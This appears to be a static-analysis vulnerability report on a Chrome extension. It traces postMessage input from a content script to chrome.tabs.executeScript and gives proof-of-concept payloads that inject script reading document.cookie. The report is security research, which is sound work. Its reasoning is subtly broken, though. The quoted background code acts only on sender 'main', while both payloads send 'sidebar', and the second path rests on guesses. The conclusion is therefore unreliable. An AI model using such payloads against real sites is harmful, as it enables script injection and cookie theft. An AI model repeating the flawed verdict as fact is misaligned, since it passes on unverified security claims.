# CoCo Analysis: akhomcacccpndpgckgpkmcijkimphhmk

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 8 (all same flow, different internal trace IDs)

---

## Sink: cs_window_eventListener_message → chrome_tabs_executeScript_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/akhomcacccpndpgckgpkmcijkimphhmk/opgen_generated_files/cs_0.js
Line 745	function receiveMessage(event) {
Line 754	if (typeof(event.data) === 'string') var parsed_data = $.parseJSON(event.data);

$FilePath$/home/teofanescu/cwsCoCo/extensions_local/akhomcacccpndpgckgpkmcijkimphhmk/opgen_generated_files/bg.js
Line 1071	if (request.sender === 'main' && request.script_requests) {
Line 1125	chrome.tabs.executeScript( tab.id, script_info[i], i < script_info.length-1 ? null : callback );

**Code:**

```javascript
// Content script - Entry point (cs_0.js line 535, 745-783)
window.addEventListener("message", receiveMessage, false);

function receiveMessage(event) {
  // Origin check present but can be bypassed
  if (event.origin !== chrome.extension.getURL('').slice(0,-1) &&
      event.origin !== "https://xlitemprod.pearsoncmg.com") return;

  if (typeof(jQuery) === 'undefined') return;

  var parsed_data;
  if (typeof(event.data) === 'string') var parsed_data = $.parseJSON(event.data);
  // ← attacker-controlled data from event.data
  else parsed_data = event.data;

  // Messages from sidebar iframe
  if (parsed_data.sender === 'sidebar' && parsed_data.login_request) {
    chrome.runtime.sendMessage(parsed_data, function(response) {
      // sends attacker data to background
    });
  }
  else if (parsed_data.sender === 'sidebar') {
    chrome.runtime.sendMessage(parsed_data, function(response) {
      // ← forwards attacker-controlled message to background
    });
  }
}

// Background script - Message handler (bg.js line 1069-1103, 1121-1128)
chrome.runtime.onMessage.addListener(function(request, sender, sendResponse) {
  if (request.sender === 'main' && request.script_requests) {
    // ← attacker-controlled request.script_requests
    executeScripts(sender.tab, request.script_requests, function() {
      chrome.tabs.sendMessage(sender.tab.id, { sender: 'inject', scripts_injected: true }, function(response) {
      })
    });
  }
  // ... other handlers
  sendResponse({ message_received: true });
});

function executeScripts(tab, script_info, callback) {
  if (script_info.length === 0) callback();
  for (var i=0; i<script_info.length; i++) {
    chrome.tabs.executeScript( tab.id
                             , script_info[i]  // ← attacker-controlled script path
                             , i < script_info.length-1 ? null : callback );
  }
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage

**Attack:**

The vulnerability allows code execution through two attack paths:

**Path 1: Direct from whitelisted domain (https://xlitemprod.pearsoncmg.com)**
```javascript
// On https://xlitemprod.pearsoncmg.com page
window.postMessage({
  sender: 'sidebar',
  script_requests: [
    { code: 'alert(document.cookie)' }
  ]
}, '*');
```

**Path 2: From extension's own iframe (more likely attack scenario)**
The extension injects an iframe from its own origin (chrome-extension://...), and the receiveMessage function accepts messages from `chrome.extension.getURL('').slice(0,-1)`, which is the extension's own origin. Since the extension loads external content or has web_accessible_resources, an attacker who can control content in the iframe can send messages:

```javascript
// In a malicious page that the extension loads or allows access to
var iframe = document.querySelector('iframe[src*="chrome-extension://"]');
if (iframe) {
  iframe.contentWindow.postMessage(JSON.stringify({
    sender: 'sidebar',
    script_requests: [
      { code: 'alert(document.cookie)' }
    ]
  }), '*');
}
```

**Impact:** Arbitrary code execution on any webpage. An attacker who can send messages from either the whitelisted domain (https://xlitemprod.pearsoncmg.com) or the extension's own iframe can execute arbitrary JavaScript code via chrome.tabs.executeScript by controlling the script_info parameter, which accepts either `{code: "..."}` for inline scripts or `{file: "..."}` for extension files.
